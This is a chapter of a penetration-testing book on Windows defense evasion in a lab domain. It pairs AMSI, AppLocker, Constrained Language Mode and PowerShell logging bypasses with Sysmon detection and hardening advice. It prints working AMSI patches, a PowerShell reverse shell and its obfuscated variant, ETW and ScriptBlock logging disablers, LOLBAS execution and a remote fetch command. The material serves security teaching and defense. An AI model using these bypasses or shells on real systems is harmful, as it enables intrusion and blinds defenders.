<html><head></head><body>
<div id="sbo-rt-content"><div id="_idContainer047">
<h1 class="chapter-number" id="_idParaDest-26"><a id="_idTextAnchor025"/>2</h1>
<h1 id="_idParaDest-27"><a id="_idTextAnchor026"/>Defense Evasion</h1>
<p>The main idea of this chapter is simple – <em class="italic">know your tooling</em>. It can be very tempting to start pulling fresh tooling from GitHub after getting an initial foothold on the target machine, looking for low-hanging fruit and quick wins. It may work well in some training labs to learn about attacking concepts; however, during real engagement, a mature opponent can easily detect your malicious activity. There are quite a lot of professionally written tools for both defense and offense, not to mention C2 frameworks, vendor EDRs, and <span class="No-Break">so on.</span></p>
<p>This chapter is not a fully comprehensive guide on how to evade all possible detection. Evasion is a constantly evolving game between the sword and the shield. Several factors can influence the way offensive operation is going, including preparation, the development of specific tooling, the team’s skill set, and the capabilities of both sides. We are not going to touch EDR/antivirus evasion. Excellent books have been published that will teach you how to find and develop possible bypasses, including attacking security <span class="No-Break">solutions themselves.</span></p>
<p>We will focus on built-in security capabilities that can be deployed and enforced in the Windows environment. In this chapter, we are going to cover the following <span class="No-Break">main topics:</span></p>
<ul>
<li>AMSI, AppLocker, and PowerShell <strong class="bold">Constrained Language Mode</strong> (<strong class="bold">CLM</strong>) deployment <span class="No-Break">and bypass</span></li>
<li>Deploy PowerShell Enhanced Logging, evade it, and use Sysmon to <span class="No-Break">detect yourself</span></li>
<li>What is ETW? What extra capabilities and insights can <span class="No-Break">it provide?</span></li>
</ul>
<h1 id="_idParaDest-28"><a id="_idTextAnchor027"/>Technical requirements</h1>
<p>In this chapter, you will use only two VMs from the GOADv2 lab – DC01 and SRV01. Ensure that SRV01 is a domain-joined machine, as we are going to use Group Policies during <span class="No-Break">this chapter.</span></p>
<h1 id="_idParaDest-29"><a id="_idTextAnchor028"/>AMSI, PowerShell CLM, and AppLocker</h1>
<p>In this section, we will discuss some of the built-in capabilities in Windows that can limit attacker’s actions on the compromised machine. AMSI, AppLocker, and PowerShell CLM can be bypassed in different ways, but considering them as defense in depth is a good decision. As usual, we need to know the limitations and cover bypasses where it <span class="No-Break">is possible.</span></p>
<h2 id="_idParaDest-30"><a id="_idTextAnchor029"/>Antimalware Scan Interface</h2>
<p>Let’s first discuss what <strong class="bold">Antimalware Scan Interface</strong> (<strong class="bold">AMSI</strong>) is. Microsoft developed it to provide a set of API calls<a id="_idIndexMarker078"/> for applications, including any third-party applications, to perform a signature-based scan of the content. Windows Defender<a id="_idIndexMarker079"/> uses it to scan PowerShell scripts, .NET, VBA macros, <strong class="bold">Windows Script Host</strong> (<strong class="bold">WSH</strong>), VBScript, and JavaScript to detect common malware. The important thing about AMSI is that you do not need to deploy it; it has been there since <span class="No-Break">Windows 10.</span></p>
<p>In plain words, the AMSI algorithm works<a id="_idIndexMarker080"/> <span class="No-Break">as follows:</span></p>
<ol>
<li><strong class="source-inline">amsi.dll</strong> will be loaded into the process memory space; for example, PowerShell and <strong class="source-inline">AmsiInitialize</strong> will <span class="No-Break">be called.</span></li>
<li>Then, <strong class="source-inline">AmsiOpenSession</strong> is called, which opens a session for <span class="No-Break">a scan.</span></li>
<li>The script content will be scanned before the execution invoking one of the APIs is called – <strong class="source-inline">AmsiScanBuffer</strong> <span class="No-Break">or </span><span class="No-Break"><strong class="source-inline">AmsiScanString</strong></span><span class="No-Break">.</span></li>
<li>If the content is clear from known malicious signatures, Microsoft Defender will return <strong class="source-inline">1</strong> as the result and the script will <span class="No-Break">be executed.</span></li>
</ol>
<p>To confirm this AMSI behavior, we can use Process Hacker[1] or API monitor[2]. These open source tools allow us to see loaded in-process modules, get information about them, and a lot of other information. In the following screenshot, we can see the loaded <strong class="source-inline">amsi.dll</strong> and a list of <span class="No-Break">exported functions:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer029">
<img alt="Figure 2.1 – Loaded amsi.dll and exported functions" height="442" src="image/B18964_02_01.jpg" width="861"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 2.1 – Loaded amsi.dll and exported functions</p>
<p>One important caveat<a id="_idIndexMarker081"/> from the Microsoft documentation is as follows – “<em class="italic">But you ultimately need to supply the scripting engine with plain, un-obfuscated code. And that is the point at which you invoke the AMSI APIs</em>.” A quick test to prove this statement is <span class="No-Break">as follows:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer030">
<img alt="Figure 2.2 – Detection and concatenation" height="203" src="image/B18964_02_02.jpg" width="623"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 2.2 – Detection and concatenation</p>
<p>It looks trivial. We can split the string first and then bypass AMSI using concatenation, but in more complex code this approach will require much more effort. There are a few strategies that were used by researchers to develop reliable bypasses – encoding/obfuscation, hooking, memory patching, forcing an error, registry key modification, and DLL hijacking. You can find two great compiled lists of bypasses and credits to original research created by <em class="italic">S3cur3Th1sSh1t</em>[3] and <em class="italic">Pentest Laboratories</em>[4]. Some of the bypasses look like a one-liner, but I highly encourage you to dive deeper and review them, read the original research, and follow the thought process. It’s also worth mentioning that not every bypass will be successful, as Microsoft tries to patch them as well. The chances are not great that the good old base64-encoded one-liners will do the trick. The best way to ensure<a id="_idIndexMarker082"/> that your bypass will work in the target environment is to precisely identify the victim’s OS version, recreate it in your lab environment, and test, <span class="No-Break">test, test.</span></p>
<p class="callout-heading">Note</p>
<p class="callout">For some quick <a id="_idIndexMarker083"/>wins, there is a great free website developed by <em class="italic">Flangvik</em> (<a href="https://amsi.fail/">https://amsi.fail/</a>), where you can generate various PowerShell snippets to disable or break AMSI. Another<a id="_idIndexMarker084"/> helpful tool is Invoke-Obfuscation[5], written by <em class="italic">Daniel Bohannon</em>. This tool has different modes. For me, AST mode was the one that provided reliable bypasses most of the time. The idea is that the script will be obfuscated in such a way that it breaks the AST parsing algorithm <span class="No-Break">in AMSI.</span></p>
<p>We will try to bypass AMSI using three different techniques: error forcing, obfuscation, and memory patching. As mentioned previously, I will use the <span class="No-Break">SRV01 machine:</span></p>
<pre class="console">
Get-WmiObject Win32_OperatingSystem | Select PSComputerName, Caption, Version | fl
PSComputerName : CASTELROCK
Caption        : Microsoft Windows Server 2019 Datacenter Evaluation
Version        : 10.0.17763</pre> <h2 id="_idParaDest-31"><a id="_idTextAnchor030"/>Way 1 – Error forcing</h2>
<p>Let’s first look at error-forcing<a id="_idIndexMarker085"/> code and a bit of <span class="No-Break">split/concatenate fantasy:</span></p>
<pre class="console">
$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
$field.SetValue($null,$true)</pre> <p>The result of running the preceding<a id="_idIndexMarker086"/> commands is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer031">
<img alt="Figure 2.3 – Error forcing" height="261" src="image/B18964_02_03.jpg" width="677"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 2.3 – Error forcing</p>
<h2 id="_idParaDest-32"><a id="_idTextAnchor031"/>Way 2 – Obfuscation</h2>
<p>For AST obfuscation, let’s try to get reverse<a id="_idIndexMarker087"/> shell callback using <strong class="source-inline">PowerShellTcpOneLine.ps1</strong> from the Nishang framework[6] and the previously mentioned Invoke-Obfuscation tool. We will set up a listener on port 443 with powercat[7] on another Windows box. Here is the original reverse <span class="No-Break">shell code:</span></p>
<pre class="console">
$client = New-Object System.Net.Sockets.TCPClient('192.168.214.135',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</pre> <p>When we try to run it, AMSI <span class="No-Break">catches us:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer032">
<img alt="Figure 2.4 – AMSI blocks original reverse shell" height="316" src="image/B18964_02_04.jpg" width="816"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 2.4 – AMSI blocks original reverse shell</p>
<p>Let’s run the Invoke-Obfuscation<a id="_idIndexMarker088"/> tool, choosing AST obfuscation, and providing the path to our original reverse shell. After obfuscation, the code looked <span class="No-Break">like this:</span></p>
<pre class="console">
Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient('192.168.214.135',443));Set-Variable -Name stream -Value ($client.GetStream());[byte[]]$bytes = 0..65535|%{0};while((Set-Variable -Name i -Value ($stream.Read($bytes, 0, $bytes.Length))) -ne 0){;Set-Variable -Name data -Value ((New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i));Set-Variable -Name sendback -Value (iex $data 2&gt;&amp;1 | Out-String );Set-Variable -Name sendback2 -Value ($sendback + 'PS ' + (pwd).Path + '&gt; ');Set-Variable -Name sendbyte -Value (([text.encoding]::ASCII).GetBytes($sendback2));$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</pre> <p>The result obtained by running<a id="_idIndexMarker089"/> the preceding commands is <span class="No-Break">as follows:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer033">
<img alt="Figure 2.5 – Obfuscated reverse shell callback" height="255" src="image/B18964_02_05.jpg" width="668"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 2.5 – Obfuscated reverse shell callback</p>
<h2 id="_idParaDest-33"><a id="_idTextAnchor032"/>Way 3 – Memory patch</h2>
<p>There are a few ways<a id="_idIndexMarker090"/> we can manipulate AMSI in memory to achieve the bypass. The key reasoning behind this is that we are in full control of the process where <strong class="source-inline">amsi.dll</strong> will be loaded. One of the examples is to force <strong class="source-inline">AmsiScanBuffer</strong> to return <strong class="source-inline">AMSI_RESULT_CLEAN</strong>. The general idea is to import API calls and then return a specific value to the <strong class="source-inline">AmsiScanBuffer()</strong> call: <strong class="source-inline">0x80070057</strong>. The original bypass is detected by AMSI now, so we can manipulate with assembly instructions by using a double <strong class="source-inline">add</strong> operand and successfully bypass the control. The code for this is <span class="No-Break">as follows:</span></p>
<pre class="console">
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $Win32
$test = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
$LoadLibrary = [Win32]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($test))
$test2 = [Byte[]] (0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
$Address = [Win32]::GetProcAddress($LoadLibrary, [System.Text.Encoding]::ASCII.GetString($test2))
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
#0:  31 c0                   xor    eax,eax
#2:  05 78 01 19 7f          add    eax,0x7f190178
#7:  05 df fe ed 00          add    eax,0xedfedf
#c:  c3                      ret
#for ($i=0; $i -lt $Patch.Length;$i++){$Patch[$i] = $Patch[$i] -0x2}
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)</pre> <p>The result obtained by running the preceding commands is <span class="No-Break">as follows:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer034">
<img alt="Figure 2.6 – Successful AMSI disarm using memory patching" height="219" src="image/B18964_02_06.jpg" width="616"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 2.6 – Successful AMSI disarm using memory patching</p>
<p>Also, as an attacker, we cannot ignore the fact that some defensive mechanisms can be abused as well as bypassed. A great example was published by <em class="italic">netbiosX</em>[8], which stated that AMSI can be used to achieve persistence on the compromised host. Using previous research and their coding skills, a fake AMSI provider was developed and registered on the compromised host. Using a special keyword, we can initiate a callback home from <span class="No-Break">our backdoor.</span></p>
<p>All the techniques mentioned<a id="_idIndexMarker091"/> here will leave some sort of trace on the victim’s machine. Moreover, even successful bypasses can still be caught by defenders. Excellent blog posts by <em class="italic">Pentest Laboratories</em>[9] and <em class="italic">F-Secure</em>[10] show how to create detections and share excellent <span class="No-Break">ready-to-use recipes.</span></p>
<p>In the next section, we are going to discuss two security controls that are quite often deployed in <span class="No-Break">corporate environments.</span></p>
<h2 id="_idParaDest-34"><a id="_idTextAnchor033"/>AppLocker and PowerShell CLM</h2>
<p>AppLocker<a id="_idIndexMarker092"/> was added by Microsoft in Windows 7 as a successor to the older <strong class="bold">Software Restriction Policies </strong>(<strong class="bold">SRP</strong>). It was supposed to be a comprehensive<a id="_idIndexMarker093"/> application white-listing solution. With this feature, you can limit not only applications, but also scripts, batches, DLLs, and more. There are a few ways that a limit can be applied: by Name, Path, Publisher, or Hash. As stated by Microsoft, AppLocker<a id="_idIndexMarker094"/> is a security feature, not a boundary. Nowadays, the recommendation is to enforce <strong class="bold">Windows Defender Application Control</strong> (<strong class="bold">WDAC</strong>) as restrictively as possible and then use AppLocker to fine-tune the restrictions. However, in complex enterprise environments, it is still common to see AppLocker alone as it is easier to deploy <span class="No-Break">and administrate.</span></p>
<p>To understand in more detail how AppLocker is working, I recommend you read four parts of <em class="italic">Tyraniddo</em>’s blog[11] about this feature. He starts the journey with the AppLocker setup and overview. In part 2, the author reveals how the process creation is blocked by the operating system’s kernel, followed by a clear example. Part 3 is devoted to rule processing, covering access tokens and access checks. Some basic understanding of security descriptors and tokens will not hurt the reader. The final part has a full focus on <span class="No-Break">DLL blocking.</span></p>
<p>Now that we know what AppLocker is, why do we need anything on top? What is PowerShell CLM, and how does it relate to AppLocker? In short, we can limit PowerShell sensitive language capabilities to the users by enabling CLM. Some examples of these sensitive capabilities are Windows API invocation, creating arbitrary types, and <span class="No-Break">dot sourcing[12].</span></p>
<p>CLM <a id="_idIndexMarker095"/>can be enforced via environment variables or by setting it through language mode. However, these methods are not reliable and can be bypassed with almost no effort from the attacker. But with system-wide application control solutions, it can be used. The idea is that PowerShell will detect when the AppLocker policy is being enforced and will run only <span class="No-Break">in CLM.</span></p>
<p><em class="italic">How robust are </em><span class="No-Break"><em class="italic">these protections?</em></span></p>
<p>We will deploy it in our <strong class="source-inline">sevenkingdoms.local</strong> lab domain. I advise you to take a snapshot before any change in the lab so we can quickly revert to the initial state if required. We will create an AppLocker group policy on DC01 and enforce it on the SRV01 server. If you have never deployed AppLocker, there is a friendly guide available[13]. The rule is straightforward – action, user, condition, and exceptions if required. By following the previously mentioned guide[13], we will create default rules and restrictions for users to run <strong class="source-inline">cmd.exe</strong>. One important caveat – if you are in the <strong class="source-inline">Administrators</strong> group, by default, AppLocker is not applied to your account. To check your current ruleset, we can use the <span class="No-Break">following command:</span></p>
<pre class="console">
Get-AppLockerPolicy -Effective | Select-Object RuleCollections -ExpandProperty RuleCollections</pre> <p>The new <strong class="source-inline">Deny_CMD</strong> rule can be seen in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer035">
<img alt="Figure 2.7 – Deny rule in AppLocker" height="216" src="image/B18964_02_07.jpg" width="1191"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 2.7 – Deny rule in AppLocker</p>
<p>Moreover, as we enforced rules<a id="_idIndexMarker096"/> for scripts as well, PowerShell went down in CLM. It is easy to check using the <span class="No-Break">following command:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer036">
<img alt="Figure 2.8 – PowerShell CLM in action" height="155" src="image/B18964_02_08.jpg" width="952"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 2.8 – PowerShell CLM in action</p>
<p>The robustness of these security features depends on the quality of the rules we are implementing. In<a id="_idIndexMarker097"/> AppLocker, we have Publisher, File Hash, and Path conditions. Let’s briefly discuss all of them and show some <span class="No-Break">possible bypasses.</span></p>
<p><em class="italic">Path</em> restrictions can be bypassed by evaluating trusted paths and copying our binary there; for example, there are plenty of subfolders inside <strong class="source-inline">C:\Windows</strong>, where the normal user can copy files. The File Hash deny rule can be bypassed by changing the binary with the known hash mentioned in the rule. Let’s bypass the first two conditions combined and execute <strong class="source-inline">nc64.exe</strong> on the host. I created the rule to block <strong class="source-inline">nc64.exe</strong> by its hash. We will first copy <strong class="source-inline">nc64.exe</strong> to the <strong class="source-inline">C:\Windows\System32\spool\drivers\color\</strong> and then bypass the File Hash rule by changing the File Hash by adding an extra <strong class="source-inline">A</strong> at the end of the file. The result of the bypass is <span class="No-Break">as follows:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer037">
<img alt="Figure 2.9 – Path and hash rule bypass for nc.exe" height="449" src="image/B18964_02_09.jpg" width="1172"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 2.9 – Path and hash rule bypass for nc.exe</p>
<p>The <em class="italic">Publisher</em> condition is much<a id="_idIndexMarker098"/> more difficult to bypass. The reason is that the application’s publisher signature and extended attributes will be checked. We cannot use self-signed certificates to bypass it, but we can abuse legitimate signed binaries, which have the extended functionality we need. There is a whole project with a list of such binaries at <a href="https://lolbas-project.github.io/">https://lolbas-project.github.io/</a>. There are two well-illustrated blog posts about common LOLBAS abuse to bypass AppLocker <a id="_idIndexMarker099"/>using <strong class="bold">InstallUtil</strong>[14] and MSBuild[15]. In brief, we will use <strong class="source-inline">MSBuild.exe</strong> to compile and run our malicious code stored in an XML file; for example, with Windows APIs we can allocate memory, and copy and run our shellcode. Another method is to use InstallUtil to run our executable if it is located on the <span class="No-Break">victim’s box:</span></p>
<pre class="console">
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U "C:\Windows\Tasks\my.exe"</pre> <p>But what if <strong class="source-inline">cmd.exe</strong> is locked down? Not a big deal! You create shortcuts of the required binaries, such as InstallUtil and csc, then manually change the target field value so that it stores the required command line to execute. It is still reliably working until the LOLBAS binaries are not blocked. The entire project with the AppLocker bypasses list is available on GitHub[16]. By evaluating them, we can assess how robust our <span class="No-Break">rules are.</span></p>
<p>Speaking about CLM bypass, there are different <a id="_idIndexMarker100"/>ways to achieve Full Language Mode, such as spawn PowerShell such that it downgrades to version 2 (rarely installed these days), use <strong class="source-inline">rundll32.exe</strong> with <strong class="source-inline">PowerShlld.dll</strong>[17], or use bypasses such as a wrapper over <strong class="bold">InstallUtil</strong>[18] and function return value patching[19]. The last three projects will require obfuscation to evade Microsoft Defender nowadays. To read more about the process of finding bypasses, I recommend going through <em class="italic">XPN’s</em> great research, “AppLocker<a id="_idIndexMarker101"/> and CLM Bypass via COM”[20]. But let me show you one of my favourite bypasses by <em class="italic">sp00ks</em> that I recently found[21]. The following code sets the environment registry value in the HKCU hive (you do not need to be an administrator for that), creates a PowerShell process using WMI, and then sets the <span class="No-Break">value back:</span></p>
<pre class="console">
$CurrTemp = $env:temp
$CurrTmp = $env:tmp
$TEMPBypassPath = "C:\windows\temp"
$TMPBypassPath = "C:\windows\temp"
Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value "$TEMPBypassPath"
Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value "$TMPBypassPath"
Invoke-WmiMethod -Class win32_process -Name create -ArgumentList "Powershell.exe"
sleep 5
#Set it back
Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value $CurrTmp
Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value $CurrTemp</pre> <p>The result obtained by running the preceding command is <span class="No-Break">as follows:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer038">
<img alt="Figure 2.10 – Example of CLM bypass" height="782" src="image/B18964_02_10.jpg" width="1161"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 2.10 – Example of CLM bypass</p>
<p>As we mentioned <a id="_idIndexMarker102"/>at the beginning of the<a id="_idIndexMarker103"/> section, the best way to harden application control is to deploy <strong class="bold">Windows Defender Application Control</strong> (<strong class="bold">WDAC</strong>) together with AppLocker. One of the most<a id="_idIndexMarker104"/> powerful collections of rules is called AaronLocker[22], which can be deployed<a id="_idIndexMarker105"/> together with WDAC in your environment via Group Policy[23]. It is recommended to start monitoring your rulesets in audit mode, gradually <span class="No-Break">fine-tuning them.</span></p>
<h1 id="_idParaDest-35"><a id="_idTextAnchor034"/>PowerShell Enhanced Logging and Sysmon</h1>
<p>In this section, we are going to explore what Sysmon[24] is and how it can be used to detect attacker’s activities. Sysmon<a id="_idIndexMarker106"/> is a system service in Windows that we can install and use to log information about various events, including process creation, various file events, registry access, named pipes, and network connections. Logs<a id="_idIndexMarker107"/> stay in Windows Event Collection. Sysmon does not prevent any attacks or provide an analysis of the events. There are a few great projects that can help you get started with Sysmon. A great community guide is provided by <em class="italic">TrustedSec</em>[25], and we will use the Sysmon config created by <em class="italic">SwiftOnSecurity</em>[26] as it is one of the best high-quality event tracing templates. Two more projects that provide a variety of config files were created by <em class="italic">Florian Roth</em>[27] and <span class="No-Break"><em class="italic">Olaf Hartong</em></span><span class="No-Break">[28].</span></p>
<p>Let’s install Sysmon, apply the configs<a id="_idIndexMarker108"/> from the preceding project, and start digging inside the logs. Installation is straightforward; only one command being run as administrator is required, which is <span class="No-Break">as follows:</span></p>
<pre class="console">
Sysmon64.exe -accepteula -i sysmonconfig-export.xml</pre> <p>The expected result is <span class="No-Break">as follows:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer039">
<img alt="Figure 2.11 – Sysmon installation" height="373" src="image/B18964_02_11.jpg" width="854"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 2.11 – Sysmon installation</p>
<p>Now, we are going<a id="_idIndexMarker109"/> to enable PowerShell Transcription, Script Block, and Module Logging. To enable them, I will use Group Policy Management on <strong class="source-inline">kingslanding.sevenkingdoms.local</strong>. I will create a separate GPO at <strong class="bold">Computer Configuration</strong> | <strong class="bold">Policies</strong> | <strong class="bold">Administrative Templates</strong> | <strong class="bold">Windows Components</strong> | <strong class="bold">Windows PowerShell</strong>. The settings can be seen in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer040">
<img alt="Figure 2.12 – Group Policies to enable PowerShell Logging" height="533" src="image/B18964_02_12.jpg" width="1124"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 2.12 – Group Policies to enable PowerShell Logging</p>
<p>These logging features<a id="_idIndexMarker110"/> are intended to provide better visibility for defenders if PowerShell is expected to be used across the organization. Our first control is <strong class="bold">Script Block Logging</strong>, including <strong class="bold">Warning Logging of Suspicious Commands</strong>. There are known bypasses found by <em class="italic">cobbr.io</em> (the author of the C2 Covenant Framework) for ScriptBlock Logging[29] and Suspicious Commands Logging[30]. I just slightly modified the code to bypass AMSI and added a bit <span class="No-Break">more visibility:</span></p>
<pre class="console">
$GroupPolicyField = [ref].Assembly.GetType('System.Management.Automation.Utils')."GetF`ie`ld"('cachedGro'+'upPolicySettings', 'N'+'onPu'+'blic,Static')
If ($GroupPolicyField) {
  $GroupPolicyCache = $GroupPolicyField.GetValue($null)
  Write-Host("Before")
  $GroupPolicyCache['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging'] | fl
  If ($GroupPolicyCache['ScriptB'+'lockLogging']) {
    $GroupPolicyCache['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging'] = 0
    $GroupPolicyCache['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging'] = 0
  }
  $val = [System.Collections.Generic.Dictionary[string,System.Object]]::new()
  $val.Add('EnableScriptB'+'lockLogging', 0)
  $val.Add('EnableScriptB'+'lockInvocationLogging', 0)
  $GroupPolicyCache['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging'] = $val
  Write-Host("After")
  $GroupPolicyCache['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging'] | fl
}</pre> <p>The result obtained<a id="_idIndexMarker111"/> from running the preceding command is <span class="No-Break">as follows:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer041">
<img alt="Figure 2.13 – PowerShell Script Block Logging bypass" height="581" src="image/B18964_02_13.jpg" width="966"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 2.13 – PowerShell Script Block Logging bypass</p>
<p>One point to consider <a id="_idIndexMarker112"/>is that our bypass will still be logged until we disable <strong class="bold">Event Tracing for Windows</strong> (<strong class="bold">ETW</strong>) for the current PowerShell session<a id="_idIndexMarker113"/> first. This can be done using the <span class="No-Break">following command:</span></p>
<pre class="console">
[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)</pre> <p>We can also obfuscate this command to bypass Suspicious ScriptBlock Logging. Do not rely much on obfuscation as an experienced blue team will de-obfuscate it with the help of a tool such as DeepBlue[31] and immediately launch the investigation. The good thing is that for this bypass, we do not need elevated privileges and only manipulate cached values from Group Policy, so no modification on the host <span class="No-Break">is required.</span></p>
<p>Two new PowerShell ScriptBlock and Module Logging bypasses were introduced by <em class="italic">BC-security</em> in their series of blog posts. The ScriptBlock bypass is based on the fact that the script block that has already been logged will be skipped if it is encountered a second time. The idea is to set the value of <strong class="source-inline">HasLogged</strong> to <strong class="source-inline">True</strong> before invoking the script. The purpose of the Module Logging bypass was to create a callable command that has no module or PowerShell snap-in associated with it[32]. Part 2 of the blog series showed how commands can be obfuscated to make the defender’s analysis more difficult[33]. Quick prevention recommendations against these bypasses will require the PowerShell <span class="No-Break">Protect module[34].</span></p>
<p>However, if PowerShell Transcription<a id="_idIndexMarker114"/> is enabled, our activity will be still logged in to the file regardless of the preceding bypass. The reason is that even if we disable transcription in the active PowerShell session, it will continue the transcription and ignore the newly changed value. The original way to bypass was shown by <em class="italic">Jann Lemm</em> from <em class="italic">Avantguard</em> in his blog post[35]. The idea is to create a custom runspace, overwrite the value of <strong class="source-inline">EnableTranscripting</strong>, and then open the new runspace. Proof-of-concept code is available in <span class="No-Break">the </span><span class="No-Break">blogpost</span><span class="No-Break">.</span></p>
<p>But what if there is a tool that can help us to bypass everything with almost no manual effort? Well, please, welcome Invisi-Shell, written by <em class="italic">Omer Yair</em>. The tool hooks .NET assemblies via the CLR Profiler API, making PowerShell security controls blind. For more details, I highly encourage you to read the tools code[36] and watch the original talk presented by the author on DerbyCon. But keep in mind that the tool is quite old and is easily detected by most <span class="No-Break">security solutions.</span></p>
<p>The most up-to-date tool<a id="_idIndexMarker115"/> to achieve all this was written by <em class="italic">mgeeky</em> and is called <strong class="bold">Stracciatella</strong>[37]. This tool is based on the SharpPick technique (launch PowerShell code from within a C# assembly using runspaces) with AMSI, ETW, and PowerShell Logging bypasses incorporated inside. Still, some AV evasion will <span class="No-Break">be required.</span></p>
<p>Let’s say we achieved administrator privileges on the compromised box and decided to disable transcription by modifying the <strong class="source-inline">EnableTranscripting</strong> registry key, located in <strong class="source-inline">HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription</strong>. This can be done with the following PowerShell command running from an <span class="No-Break">elevated shell:</span></p>
<pre class="console">
Set-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription -Name  EnableTranscripting -Value 0</pre> <p>But let’s say we have a Sysmon rule, such as <span class="No-Break">the following:</span></p>
<pre class="console">
&lt;TargetObject name="PowerShell Logging Changes" condition="begin with"&gt;HKLM\Software\Policies\Microsoft\Windows\PowerShell\&lt;/TargetObject&gt;</pre> <p>We will get an event<a id="_idIndexMarker116"/> that could potentially trigger <span class="No-Break">an investigation:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer042">
<img alt="Figure 2.14 – Sysmon detects registry change" height="512" src="image/B18964_02_14.jpg" width="602"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 2.14 – Sysmon detects registry change</p>
<p>Another good example of Sysmon detection is AMSI provider deletion via the registry, which will create event ID 13 in the log. All the providers have their unique keys. For example, Windows Defender has <strong class="source-inline">HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}</strong>. Sysmon can provide much more from a detection perspective if you examine the published <span class="No-Break">configuration files.</span></p>
<p>Another good example for Sysmon is network connection detection. Let’s try to run something like the <span class="No-Break">following command:</span></p>
<pre class="console">
SyncAppvPublishingServer.vbs "br; iwr http://192.168.13.152:443/a"</pre> <p>Sysmon will detect activity, but not prevent <span class="No-Break">the connection:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer043">
<img alt="Figure 2.15 – Suspicious outbound connection detected by Sysmon" height="537" src="image/B18964_02_15.jpg" width="661"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 2.15 – Suspicious outbound connection detected by Sysmon</p>
